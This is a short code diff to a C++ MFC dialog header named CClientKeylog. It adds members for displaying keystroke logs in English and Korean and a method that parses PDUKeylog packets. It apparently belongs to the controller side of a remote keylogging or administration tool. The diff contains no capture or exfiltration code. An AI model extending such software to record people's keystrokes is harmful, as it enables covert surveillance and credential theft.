@@ -2,6 +2,8 @@
 
 #include <vector>
 
+#include "definition.h"
+
 // CClientKeylog 대화 상자
 
 class CClientKeylog : public CDialogEx
@@ -24,7 +26,14 @@ protected:
 private:
 	CString process_name;
 public:
-	CString m_client_keylog;
+//	CString m_client_keylog;
 public:
 	CString GetProcessName();
+	CEdit m_edit_client_keylog;
+	CString m_client_keylog;
+	void PrintKeylog();
+	int m_keylog_lang;
+	CString m_client_keylog_ko;
+	void ScanKeylog(PDUKeylog* pdu);
+	afx_msg void OnClickedRadioKeylogEn(UINT uiID);
 };
